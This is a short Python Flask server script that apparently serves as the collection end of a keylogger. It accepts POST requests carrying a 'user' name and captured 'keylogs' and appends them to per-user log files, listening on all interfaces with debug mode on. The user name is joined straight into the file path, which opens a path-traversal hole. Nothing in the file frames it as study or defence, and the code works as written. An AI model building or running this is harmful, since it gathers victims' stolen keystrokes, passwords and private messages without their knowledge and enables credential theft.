from flask import Flask, jsonify, request
import os
import json

app = Flask(__name__)
port = 5001

@app.route('/', methods=['GET'])
def index():
  return 'Server running correctly'

@app.route('/sendData', methods=['POST'])
def getData():
  if 'user' not in request.form or 'keylogs' not in request.form:
    return { 'success': 0, 'message': 'Missing keys in post data'}

  user, newData = request.form['user'], request.form['keylogs']

  logFilePath = './logs/'+user+'_log.out'
  logFile = open(logFilePath, 'a')
  logFile.write(newData)
  logFile.close()

  return { 'success': 1, 'message': 'Received data for user: '+user }

if __name__ == "__main__":
  if not os.path.exists('logs'):
    print("Creating folder for logs")
    os.mkdir('logs')

  print(f"Log Server is listening on port {port}")
  app.run(debug=True, host='0.0.0.0', port=port)